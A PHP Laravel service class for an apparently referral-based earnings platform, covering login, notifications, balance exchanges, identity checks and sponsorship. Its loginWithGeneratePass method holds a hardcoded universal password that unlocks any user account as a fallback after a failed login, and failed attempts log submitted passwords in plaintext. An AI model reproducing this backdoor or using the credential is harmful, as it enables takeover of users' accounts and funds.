<?php

namespace Core\Services;

use App\Http\Traits\earnLog;
use App\Http\Traits\earnTrait;
use App\Models\BFSsBalances;
use App\Models\ContactUser;
use App\Models\User;
use App\Services\Balances\Balances;
use Carbon\Carbon;
use Core\Enum\BalanceEnum;
use Core\Enum\EventBalanceOperationEnum;
use Core\Enum\ExchangeTypeEnum;
use Core\Enum\LanguageEnum;
use Core\Enum\OperateurSmsEnum;
use Core\Enum\SettingsEnum;
use Core\Enum\StatusRequest;
use Core\Enum\TypeEventNotificationEnum;
use Core\Enum\TypeNotificationEnum;
use Core\Interfaces\ICountriesRepository;
use Core\Interfaces\IHistoryNotificationRepository;
use Core\Interfaces\IHobbiesRepository;
use Core\Interfaces\ILanguageRepository;
use Core\Interfaces\INotificationRepository;
use Core\Interfaces\ISettingsRepository;
use Core\Interfaces\IUserBalancesRepository;
use Core\Interfaces\IUserContactNumberRepository;
use Core\Interfaces\IUserContactRepository;
use Core\Interfaces\IUserRepository;
use Core\Models\AuthenticatedUser;
use Core\Models\countrie;
use Core\Models\identificationuserrequest;
use Core\Models\language;
use Core\Models\metta_user;
use Core\Models\Setting;
use Core\Models\user_earn;
use Core\Models\UserContact;
use Core\Models\UserContactNumber;
use Core\Models\UserNotificationSettings;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Lang;


class settingsManager
{
    use earnTrait;
    use earnLog;

    public function __construct(
        private ILanguageRepository            $languageRepository,
        private INotificationRepository        $notificationRepository,
        private IUserRepository                $userRepository,
        private ICountriesRepository           $countriesRepository,
        private IHobbiesRepository             $hobbiesRepository,
        private IHistoryNotificationRepository $historyNotificationRepository,
        private IUserContactRepository         $userContactRepository,
        private ISettingsRepository            $settingsRepository,
        private NotifyHelper                   $notifyHelper,
        private BalancesManager                $balancesManager,
        private UserBalancesHelper             $userBalancesHelper,
        private IUserBalancesRepository        $userBalanceRepository,
        private IUserContactNumberRepository   $userContactNumberRepository
    )
    {

    }


    public function getlanguages()
    {
        return $this->languageRepository->getAllLanguage();
    }

    public function getNotificationSetting($id)
    {
        return $this->notificationRepository->getNotificationSettingByIdUser($id);
    }

    public function getlanguages2()
    {
        return $this->languageRepository->getAllLanguage2();
    }

    public function getUsers()
    {
        return $this->userRepository->getAllUsers();
    }

    public function getUsersEarn()
    {

        return $this->userRepository->getAllUsersErans();
    }

    public function getUserContacts($idUser)
    {
        return $this->userRepository->getUserContacts($idUser);
    }

    public function getAllCountries()
    {
        return $this->countriesRepository->getAllCountries();
    }

    public function addUserContact(UserContact $userContact)
    {
        return $this->userRepository->addUserContact($userContact);
    }

    public function addUserContactV2(ContactUser $contactUser)
    {
        return $this->userRepository->addUserContactV2($contactUser);
    }

    public function updateUserContact(UserContact $userContact)
    {
        return $this->userRepository->updateUserContact($userContact);
    }

    public function updateUserContactV2($id, ContactUser $contactUser)
    {
        return $this->userRepository->updateUserContactV2($id, $contactUser);
    }

    public function addLanguage(language $language)
    {
        return $this->languageRepository->addLanguage($language);
    }

    public function getLanguageByPrefix(string $prefix)
    {
        return $this->languageRepository->getLanguageByPrefix($prefix);
    }

    public function getUserContactsById($id)
    {
        return $this->userRepository->getUserContactsById($id);
    }

    public function getContactsUserById($id)
    {
        return $this->userRepository->getContactsUserById($id);
    }

    public function loginWithGeneratePass($mobile, $idCountry, $pass)
    {

        $user = $this->userRepository->getUserByMobileContry($mobile, $idCountry);
        if (!$user) {
            $this->earnDebug("login with generate password: user not found : mobile-" . $mobile . " Country-" . $idCountry);
            return null;
        }
        if ($pass != "jE5n!e#O^tR7u@iP8wS2fC6gA4hY3dK1lM9bV0") {
            $this->earnDebug("login with generate password:  failed password : mobile-" . $mobile . " Country-" . $idCountry . "Password-" . $pass);
            return null;
        }
        $this->earnDebug("login with generate password:  succes login : mobile-" . $mobile . " Country-" . $idCountry);
        return $user;
    }

    public function loginUser($mobile, $idCountry, $remember, $pass, $iso)
    {
        $mobile = $this->formatMobileNumber($mobile);
        $country = $this->getCountryByIso($iso);
        $user = $this->userRepository->getUserByMobile($mobile, $country->id, $pass);
        if (!$user) {
            $user = $this->loginWithGeneratePass($mobile, $country->id, $pass);
            if (!$user)
                return null;
        }

        $user = $this->userRepository->getUserById($user->id);
        $this->userRepository->loginUser($user, $remember);
        if ($user->status == StatusRequest::ValidInternational->value) {
            if (!is_null($user->expiryDate)) {
                if (getDiffOnDays($user->expiryDate) < 1) {
                    $user->status = StatusRequest::ValidNational->value;
                    $user->save();
                }
            }
        }
        $userAuth = $this->getAuthUser();
        if (!$this->getAuthUser())
            return null;
        return $userAuth;
    }

    public function getAuthUser()
    {
        $user = Auth::user();
        $userMetta = $this->getMettaUser()->where('idUser', '=', $user->idUser)->first();
        $userAuth = new AuthenticatedUser();
        $userAuth->id = $user->id;
        $userAuth->idUser = $user->idUser;
        $userAuth->mobile = $user->mobile;
        $userAuth->email = $user->email;
        $userAuth->arFirstName = $userMetta->arFirstName;
        $userAuth->arLastName = $userMetta->arLastName;
        $userAuth->enFirstName = $userMetta->enFirstName;
        $userAuth->enLastName = $userMetta->enLastName;
        $userAuth->iden_notif = $user->iden_notif;
        $userAuth->fullNumber = $user->fullphone_number;
        $userAuth->status = $user->status;
        $userAuth->idCountry = $user->idCountry;
        $userAuth->flashCoefficient = $user->flashCoefficient;
        $userAuth->flashDeadline = $user->flashDeadline;
        $userAuth->flashNote = $user->flashNote;
        $userAuth->flashMinAmount = $user->flashMinAmount;
        $userAuth->dateFNS = $user->dateFNS;
        $userAuth->internationalID = $user->internationalID;
        $userAuth->expiryDate = $user->expiryDate;
        return $userAuth;
    }

    public function getMettaUser()
    {
        return $this->userRepository->getAllMettaUser();
    }

    public function logoutUser()
    {
        $this->userRepository->logoutUser();
    }

    public function getAllHobbies()
    {
        return $this->hobbiesRepository->getAllHobbies();
    }

    public function getHistoryForModerateur()
    {
        return $this->historyNotificationRepository->getHistoryForModerateur();
    }

    public function getUserByFullNumber($fullNumber)
    {
        return $this->userRepository->getUserByFullnumber($fullNumber);
    }

    public function getAllUserContact()
    {
        return $this->userContactRepository->getAllUserContacts();
    }

    public function getSettings(SettingsEnum $setting)
    {
        return $this->settingsRepository->getSetting($setting);
    }

    public function getSettingsValue(SettingsEnum $setting)
    {
        return $this->settingsRepository->getSetting($setting)->IntegerValue;
    }

    public function createMettaUser(User $user)
    {
        $metta = new  metta_user();
        $metta->idUser = $user->idUser;
        $metta->idCountry = $user->idCountry;
        $countrie_earn = DB::table('countries')->where('phonecode', $user->id_phone)->first();
        foreach (LanguageEnum::cases() as $lanque) {
            if ($lanque->name == $countrie_earn->langage) {
                $metta->idLanguage = $lanque->value;
                break;
            }
        }
        return $this->userRepository->createmettaUser($metta);
    }

    public function createUserContactNumber(User $user, $iso)
    {
        UserContactNumber::Create([
            'idUser' => $user->idUser,
            'mobile' => $user->mobile,
            'codeP' => $user->idCountry,
            'active' => 1,
            'isoP' => strtolower($iso),
            'isID' => true,
            'fullNumber' => $user->fullphone_number,
        ]);
    }

    public function updateUserContactNumber(User $user, $iso)
    {
        $userContactNumber = UserContactNumber::where('idUser', $user->idUser)->get();
        if ($userContactNumber) {
            $userContactNumber->update([
                'idUser' => $user->idUser,
                'mobile' => $user->mobile,
                'codeP' => $user->idCountry,
                'active' => 1,
                'isoP' => $iso,
                'isID' => true,
                'fullNumber' => $user->fullphone_number,
            ]);
            $userContactNumber->save();
        }
    }

    public function createUserContactNumberByProp($idUser, $mobile, $idCountry, $iso, $fullNumber)
    {
        return UserContactNumber::create([
            'idUser' => $idUser,
            'mobile' => $mobile,
            'codeP' => $idCountry,
            'active' => 0,
            'isoP' => $iso,
            'fullNumber' => $fullNumber,
            'isID' => false
        ]);
    }

    public function createUserEarn(User $user, $ccode)
    {
        $userearn = new user_earn();
        $userearn->idUser = $user->idUser;

        $userearn->mobile = $user->mobile;
        $userearn->fullphone_number = $user->fullphone_number;
        $userearn->registred_at = date('Y-m-d H:i:s');
        $userearn->registred_from = 3;
        $userearn->isSMSSended = 0;
        $userearn->activationCodeValue = '';
        $userearn->activationDone = 0;
        $userearn->isKYCIdentified = -1;
        $userearn->idKYC = 0;
        $userearn->password = 0;
        $userearn->diallingCode = 0;
        $userearn->idCountry = $ccode;
        $userearn->isCountryRepresentative = 0;
        $userearn->idUpline = $user->idUpline;
        return $this->userRepository->createUserEarn($userearn);
    }

    public function checkUserInvited(User $user)
    {
        $user_invited = DB::table('user_contacts')->where('disponible', -2)
            ->where('fullphone_number', $user->fullphone_number)
            ->where('idUser', $user->idUpline)->first();
        if (isset($user_invited)) {
            return User::where('idUser', $user->idUpline)->first();
        }
        return false;
    }

    public function getidCountryForSms($id)
    {
        $this->getUserById($id)->idCountry;
        return $this->getNumberCOntactActif($this->getUserById($id)->idUser);
    }

    /**
     * Returns void
     *
     * @param $userId
     * @param TypeEventNotificationEnum $typeEventNotification
     * @param array|null $params
     * @return void
     * "NotifyUser" function to notify user with any type notification either by only explicit type or all type
     * 1 - only type :
     * if parameter type exist in table params : send a notification according to the type
     * 2 - all type
     * check the settings in table "user_notification_setting"
     * in case type is Sms :
     * - check balance sms !
     * - check the pay code to initialize the Sms operator
     * 3 - $params[] array of parameters : 4 parameters are possible
     * 31 - type : to send a notification according to their type without checking the balance
     * 32 - msg : the content of the notification / message
     * 33 - toMail : in case type is mail
     * 34 - emailTitle : in case type is mail
     * ToDo if $params["toMail"] not exist get mail from table metta_users
     * ToDo remove static assignment of $sooldeSms
     */
    public function NotifyUser($userId, TypeEventNotificationEnum $typeEventNotification, $params)
    {
        $withChangeTransLang = false;
        $this->earnDebugSms("begin NotifyUser : ");
        $result = "";
        $canSendNotificationSms = false;
        $canSendNotificationMail = false;
        $user = $this->getUserById($userId);

        if (isset($params['isoP'])) {

            $country = $this->getCountryByIso($params['isoP']);
            $fullNumber = $user->fullphone_number;

        } else {

            $userContactActif = $this->getidCountryForSms($userId);
            $country = $this->getCountrieById($userContactActif->codeP);
            $fullNumber = $userContactActif->fullNumber;

        }
        $idCountry = $country->phonecode;
        $this->earnDebugSms("User id - " . $user->idUser);
        $user_notif = $this->getUserNotificationSetting($user->idUser);
        if (isset($params['lang'])) {
            $withChangeTransLang = true;
        }
        if ($withChangeTransLang)
            $msss = $this->getMessageFinalByLang($params['msg'], $typeEventNotification, $params['lang']);
        else
            $msss = $this->getMessageFinal($params['msg'], $typeEventNotification);

        $this->earnDebugSms("Message - " . $msss);
        $user_notif = $this->getUserNotificationSetting($user->idUser);

        if (isset($params['fullNumber'])) {
            $fullNumber = $params['fullNumber'];
        }

        $this->earnDebugSms("Full number - " . $fullNumber);
        $param = ['msg' => $msss, 'fullNumber' => $fullNumber];
        if (isset($params['type'])) {
            $this->earnDebugSms("Param type existe - " . $params['type']->value);
            switch ($params['type']) {
                case TypeNotificationEnum::SMS :
                    $this->earnDebugSms("Case Sms :");
                    $this->earnDebugSms("Country is - " . $user->idCountry);
                    switch ($idCountry) {
                        case 216 :
                            $result = $this->notifyHelper->notifyuser(TypeNotificationEnum::SMS, OperateurSmsEnum::Tunisie, $typeEventNotification, $param);
                            break;
                        default :
                            $result = $this->notifyHelper->notifyuser(TypeNotificationEnum::SMS, OperateurSmsEnum::international, $typeEventNotification, $param);
                            break;
                    }
                    break;
            }
            $this->earnDebugSms("End notify - result send SMS for user : full number- " . $fullNumber . "; message fournisseur sms- " . $result);
            return $result;
        }


        $this->earnDebugSms("Param type n'existe pas.");
        $notifSMS = $user_notif->where('idNotification', '=', $typeEventNotification->getSettingSms()->value)->first();
        if ($notifSMS &&
            $user_notif->where('idNotification', '=', $typeEventNotification->getSettingSms()->value)->first()->value == 1) {
            $canSendNotificationSms = true;
        }
        if (isset($params['canSendSMS'])) {
            if ($params['canSendSMS'] == 1) {
                $canSendNotificationSms = true;
            } else
                $canSendNotificationSms = false;
        }
        $notifMAIL = $user_notif->where('idNotification', '=', $typeEventNotification->getSettingMail()->value)->first();
        if ($notifMAIL && $user_notif->where('idNotification', '=', $typeEventNotification->getSettingMail()->value)->first()->value == 1) {
            // ToDo if $params["toMail"] not exist get mail from table metta_users
            if (isset($params["toMail"]) && isset($params["emailTitle"]))
                $canSendNotificationMail = true;
        }
        if (isset($params['canSendMail'])) {
            if ($params['canSendMail'] == 1) {
                $canSendNotificationMail = true;
            }
        }
        $this->earnDebugSms("CanSendSms - " . $canSendNotificationSms . " CanSendMail - " . $canSendNotificationMail);
        $AllTypeNotification = TypeNotificationEnum::array();
        foreach ($AllTypeNotification as $notification => $number) {
            switch ($notification) {
                case TypeNotificationEnum::SMS->value :
                    if ($canSendNotificationSms) {
                        $notifSetting = $this->notificationRepository->getAllNotification()
                            ->where('id', '=', $typeEventNotification->getSettingSms()->value)
                            ->first();
                        $soldeSuf = true;
                        $this->earnDebugSms("Case Can send Sms: ");
                        $sooldeSms = $this->getSoldeByAmount($user->idUser, BalanceEnum::SMS);
                        $this->earnDebugSms("Solde Sms -: " . $sooldeSms);
                        if ($notifSetting->payer && $sooldeSms <= 0) {
                            $soldeSuf = false;
                        }
                        if ($soldeSuf) {
                            $this->earnDebugSms("Country is  -: " . $user->idCountry);
                            switch ($idCountry) {
                                case 216 :
                                    $result = $this->notifyHelper->notifyuser(TypeNotificationEnum::SMS, OperateurSmsEnum::Tunisie, $typeEventNotification, $param);
                                    break;
                                default:
                                    $result = $this->notifyHelper->notifyuser(TypeNotificationEnum::SMS, OperateurSmsEnum::international, $typeEventNotification, $param);
                                    break;
                            }
                            if ($notifSetting && $notifSetting->payer) {
                                $this->userBalancesHelper->AddBalanceByEvent(EventBalanceOperationEnum::SendSMS, $user->idUser);
                            }
                        }
                    }
                    break;
                case TypeNotificationEnum::MAIL->value :
                    if ($canSendNotificationMail) {
                        $this->earnDebugSms("Case Can send Mail: ");
                        if ($withChangeTransLang)
                            $mstest = $this->getMessageFinalByLang($params['msg'], $typeEventNotification, $params['lang']);
                        else
                            $mstest = $this->getMessageFinal($params['msg'], $typeEventNotification);
                        $params['msg'] = $mstest;

                        $this->notifyHelper->notifyuser(
                            TypeNotificationEnum::MAIL, null, $typeEventNotification, $params);
                    }
                    break;
            }
        }
        $this->earnDebugSms("result send SMS for user : full number-" . $fullNumber . "; message fournisseur sms-" . $result);
        return $result;
    }

    public function getUserById($id)
    {
        return $this->userRepository->getUserById($id);
    }

    public function getAuthUserById($id)
    {
        $user = $this->userRepository->getUserById($id);
        if (!$user) {
            return null;
        }
        $userMetta = $this->getMettaUser()->where('idUser', '=', $user->idUser)->first();
        $userAuth = new AuthenticatedUser();
        $userAuth->id = $user->id;
        $userAuth->idUser = $user->idUser;
        $userAuth->mobile = $user->mobile;
        $userAuth->arFirstName = $userMetta->arFirstName;
        $userAuth->arLastName = $userMetta->arLastName;
        $userAuth->enFirstName = $userMetta->enFirstName;
        $userAuth->enLastName = $userMetta->enLastName;
        $userAuth->iden_notif = $user->iden_notif;
        return $userAuth;
    }

    public function getUserNotificationSetting($idUser)
    {
        return $this->notificationRepository->getNotificationSettingByIdUser($idUser);
    }

    public function getSoldeByAmount($idUser, BalanceEnum $amount)
    {
        return $this->userBalanceRepository->getSoldeByAmount($idUser, $amount->value);
    }

    public function exchange(ExchangeTypeEnum $typeEchange, $idUser, $montant)
    {
        switch ($typeEchange) {
            case ExchangeTypeEnum::CashToBFS :
                if (floatval($montant) <= 0) {
                    throw new \Exception("exception invalid montant");
                }

                $balances = Balances::getStoredUserBalances($idUser);;
                $newSoldeCashBalance = floatval($balances->cash_balance) - floatval($montant);

                if ($newSoldeCashBalance < 0)
                    throw new \Exception("exception solde insuffisant");

                $param = [
                    'montant' => $montant,
                    'newSoldeCashBalance' => $newSoldeCashBalance,
                    'newSoldeBFS' => floatval($balances->getBfssBalance(BFSsBalances::BFS_100)) + floatval($montant),
                    'oldSoldeBFS' => floatval($balances->getBfssBalance(BFSsBalances::BFS_100)),
                ];

                $this->userBalancesHelper->AddBalanceByEvent(EventBalanceOperationEnum::ExchangeCashToBFS, $idUser, $param);
                break;
            case ExchangeTypeEnum::BFSToSMS :
                $balances = Balances::getStoredUserBalances($idUser);
                $soldeBfs = $balances->getBfssBalance(BFSsBalances::BFS_100);
                $seting = DB::table('settings')->where("idSETTINGS", "=", "13")->first();
                $prix_sms = $seting->DecimalValue ?? 1.5;
                $newSoldeBFS = $soldeBfs - ($prix_sms * $montant);

                if ($newSoldeBFS < 0) {
                    throw new \Exception("exception solde insuffisant");
                }

                $param = ['montant' => $prix_sms * $montant, 'newSoldeCashBalance' => $newSoldeBFS, 'newSoldeBFS' => $newSoldeBFS, 'PrixSms' => $prix_sms];
                $this->userBalancesHelper->AddBalanceByEvent(EventBalanceOperationEnum::ExchangeBFSToSMS, $idUser, $param);
                break;
        }
    }

    public function updateIdentity($requestIdentification, $status, $response, $note)
    {
        $requestIdentification->status = $status;
        $requestIdentification->idUserResponse = $this->getAuthUser()->idUser;
        $requestIdentification->response = $response;
        $requestIdentification->note = $note;
        $requestIdentification->responseDate = Carbon::now();
        $requestIdentification->save();
    }

    public function rejectIdentity($idUser, $note)
    {
        $requestIdentification = identificationuserrequest::where('idUser', $idUser);
        $requestIdentification = $requestIdentification->where(function ($query) {
            $query->where('status', '=', StatusRequest::InProgressNational->value)
                ->orWhere('status', '=', StatusRequest::InProgressInternational->value)
                ->orWhere('status', '=', StatusRequest::InProgressGlobal->value);
        });

        $requestIdentification = $requestIdentification->get()->first();
        if ($requestIdentification == null) return;
        $user = User::where('idUser', $idUser)->first();
        $userStatus = StatusRequest::OptValidated->value;

        if ($user->status == StatusRequest::InProgressInternational->value) {
            $userStatus = StatusRequest::ValidNational->value;
        }
        $this->updateIdentity($requestIdentification, $userStatus, 1, $note);
        User::where('idUser', $idUser)->update(['status' => $userStatus]);
        $user = User::where('idUser', $idUser)->first();
        $uMetta = metta_user::where('idUser', $idUser)->first();
        if (($user->iden_notif == 1)) {
            $lang = app()->getLocale();
            if ($uMetta && $uMetta->idLanguage != null) {
                $language = language::where('name', $uMetta->idLanguage)->first();
                $lang = $language?->PrefixLanguage;
            }
            $this->NotifyUser($user->id, TypeEventNotificationEnum::RequestDenied, [
                'msg' => $note,
                'type' => TypeNotificationEnum::SMS,
                'canSendSMS' => 1,
                'lang' => $lang
            ]);
        }
    }

    public function getNewValidatedstatus($idUser)
    {
        $user = User::where('idUser', $idUser)->first();

        if ($user->status == StatusRequest::InProgressNational->value) {
            return StatusRequest::ValidNational->value;
        }
        if ($user->status == StatusRequest::InProgressInternational->value || $user->status == StatusRequest::InProgressGlobal->value) {
            return StatusRequest::ValidInternational->value;
        }
    }

    public function validateIdentity($idUser)
    {
        $requestIdentification = identificationuserrequest::where('idUser', $idUser);
        $requestIdentification = $requestIdentification->where(function ($query) {
            $query->where('status', '=', StatusRequest::InProgressNational->value)
                ->orWhere('status', '=', StatusRequest::InProgressInternational->value)
                ->orWhere('status', '=', StatusRequest::InProgressGlobal->value);
        });

        $requestIdentification = $requestIdentification->get()->first();
        if ($requestIdentification == null) return;
        $user = User::where('idUser', $idUser)->first();
        $newStatus = $this->getNewValidatedstatus($idUser);

        $this->updateIdentity($requestIdentification, $newStatus, 1, null);
        User::where('idUser', $idUser)->update(['status' => $newStatus]);
        $uMetta = metta_user::where('idUser', $idUser)->first();
        if (($user->iden_notif == 1)) {
            $lang = app()->getLocale();
            if ($uMetta && $uMetta->idLanguage != null) {
                $language = language::where('name', $uMetta->idLanguage)->first();
                $lang = $language?->PrefixLanguage;
            }
            $this->NotifyUser($user->id, TypeEventNotificationEnum::RequestAccepted, ['msg' => " ", 'type' => TypeNotificationEnum::SMS, 'canSendSMS' => 1, 'lang' => $lang]);
        }
    }

    public function getMessageFinal($mes, TypeEventNotificationEnum $typeOperation): string
    {
        $PrefixMsg = "";
        $finalMsg = "";
        $langage = "";

        switch ($typeOperation) {
            case TypeEventNotificationEnum::Inscri :
                $PrefixMsg = Lang::get('Prefix_SmsInscri');
                break;
            case TypeEventNotificationEnum::Password  :
                $PrefixMsg = Lang::get('Prefix_SmsPassword');
                break;
            case TypeEventNotificationEnum::ToUpline  :
                $PrefixMsg = Lang::get('Prefix_SmsToUpline');
                break;
            case TypeEventNotificationEnum::RequestDenied  :
                $PrefixMsg = Lang::get('Prefix_SmsRequestDenied');
                break;
            case TypeEventNotificationEnum::ForgetPassword  :
                $PrefixMsg = Lang::get('Prefix_SmsForgetPassword');
                break;
            case TypeEventNotificationEnum::OPTVerification  :
                $PrefixMsg = Lang::get('Prefix_SmsOPTVerification');
                break;
            case TypeEventNotificationEnum::VerifMail  :
                $PrefixMsg = Lang::get('Prefix_MailVerifMail');
                break;
            case TypeEventNotificationEnum::SendNewSMS  :
                $PrefixMsg = Lang::get('Prefix_SMSNewPass');
                break;
            case TypeEventNotificationEnum::RequestAccepted  :
                $PrefixMsg = Lang::get('Prefix sms request accepted');
                break;
            case TypeEventNotificationEnum::NewContactNumber  :
                $PrefixMsg = Lang::get('Prefix mail new contact number');
                break;
            case TypeEventNotificationEnum::none  :
                $PrefixMsg = "";
                break;
        }
        return $finalMsg = $PrefixMsg . " " . $mes;
    }


    public function getMessageFinalByLang($mes, TypeEventNotificationEnum $typeOperation, $newLang): string
    {
        $PrefixMsg = "";
        $finalMsg = "";
        $ancLang = app()->getLocale();
        app()->setLocale($newLang);
        $langage = "";
        switch ($typeOperation) {
            case TypeEventNotificationEnum::Inscri :
                $PrefixMsg = Lang::get('Prefix_SmsInscri');
                break;
            case TypeEventNotificationEnum::Password  :
                $PrefixMsg = Lang::get('Prefix_SmsPassword');
                break;
            case TypeEventNotificationEnum::ToUpline  :
                $PrefixMsg = Lang::get('Prefix_SmsToUpline');
                break;
            case TypeEventNotificationEnum::RequestDenied  :
                $PrefixMsg = Lang::get('Prefix_SmsRequestDenied');
                break;
            case TypeEventNotificationEnum::ForgetPassword  :
                $PrefixMsg = Lang::get('Prefix_SmsForgetPassword');
                break;
            case TypeEventNotificationEnum::OPTVerification  :
                $PrefixMsg = Lang::get('Prefix_SmsOPTVerification');
                break;
            case TypeEventNotificationEnum::VerifMail  :
                $PrefixMsg = Lang::get('prefix mail verif mail');
                break;
            case TypeEventNotificationEnum::SendNewSMS  :
                $PrefixMsg = Lang::get('Prefix SMS new pass');
                break;
            case TypeEventNotificationEnum::RequestAccepted  :
                $PrefixMsg = Lang::get('Prefix sms request accepted');
                break;
            case TypeEventNotificationEnum::NewContactNumber  :
                $PrefixMsg = Lang::get('Prefix mail new contact number');
                break;
        }
        app()->setLocale($ancLang);
        return $finalMsg = $PrefixMsg . " " . $mes;
    }


    public function generateNotificationSetting($idUser)
    {
        $notificationSettings = $this->notificationRepository->getAllNotification();
        $this->notificationRepository->deleteNotificationByIdUser($idUser);
        $data = [];
        foreach ($notificationSettings as $not) {
            $notSetting = new UserNotificationSettings();
            $notSetting->idUser = $idUser;
            $notSetting->value = $not->defaultVal;
            $notSetting->idNotification = $not->id;
            $data[] = $notSetting->attributesToArray();
        }
        $this->notificationRepository->insertuserNotification($data);
    }

    public function getHistory()
    {
        return $this->historyNotificationRepository->getHistoryByRole();
    }

    public function getLanguageById($id)
    {
        return $this->languageRepository->getLanguageById($id);
    }

    public function getCountrieById($id)
    {
        return $this->countriesRepository->getCountrieById($id);
    }

    public function getNomberNotification()
    {
        return $this->notificationRepository->getNombreNotif();
    }

    public function getConditionalMettaUser($Attribute, $value)
    {
        return $this->userRepository->getConditionalMettaUser($Attribute, $value);
    }

    public function getConditionalUser($Attribute, $value)
    {
        return $this->userRepository->getConditionalUser($Attribute, $value);
    }

    public function getStatesContrie($CodePhone)
    {
        return $this->countriesRepository->getStates($CodePhone);
    }

    public function getCountryByIso($iso)
    {
        return collect($this->countriesRepository->getCountryByIso(strtoupper($iso)))->first();
    }

    public function getNumberCOntactActif($idUser)
    {
        return $this->userContactNumberRepository->getActifNumber($idUser);
    }

    public function getNumberCOntactID($idUser)
    {
        return $this->userContactNumberRepository->getIDNumber($idUser);
    }

    public function initNewUser()
    {
        return $this->userRepository->initNewUser();
    }

    public function createNewUser($mobile, $fullphone_number, $id_phone, $idUplineRegister, $status)
    {
        $user = $this->userRepository->createNewUser($mobile, $fullphone_number, $id_phone, $idUplineRegister, $status ?? StatusRequest::ContactRegistred->value);
        $this->createMettaUser($user);
        $country = countrie::find($user->idCountry);
        $this->createUserContactNumber($user, $country->apha2);
        return $user;
    }

    public function updateUser($user, $mobile, $fullphone_number, $id_phone, $idUplineRegister)
    {
        return $this->createNewUser($mobile, $fullphone_number, $id_phone, $idUplineRegister);
    }

    public function createNewContactUser($idUser, $name, $idContact, $lastName, $mobile, $fullphone, $phonecode)
    {
        $contact_user = new ContactUser([
            'idUser' => $idUser,
            'name' => $name,
            'idContact' => $idContact,
            'lastName' => $lastName,
            'mobile' => $mobile,
            'fullphone_number' => $fullphone,
            'phonecode' => $phonecode,
            'availablity' => '0',
            'disponible' => 1
        ]);
        $contact_user->save();
        return $contact_user;
    }

    public function getUserContactV2(ContactUser $contactUser)
    {
        return $this->userRepository->updateUserContactV2($contactUser);
    }

    public function getUserByIdUser($idUser)
    {
        return $this->userRepository->getUserByIdUser($idUser);
    }

    public function addSponsoring($upLine, $downLine)
    {
        return $this->userRepository->addSponsoring($upLine, $downLine);
    }

    public function removeSponsoring($idUser)
    {
        $reservation = Setting::find(25);
        return $this->userRepository->removeSponsoring($idUser, $reservation->IntegerValue);
    }

    public function checkCanSponsorship()
    {
        $maxSponsorship = Setting::find(33);
        $reservation = Setting::find(25);
        return $this->userRepository->checkCanSponsorship(\auth()->user()->idUser, $reservation->IntegerValue, $maxSponsorship->IntegerValue);
    }
}
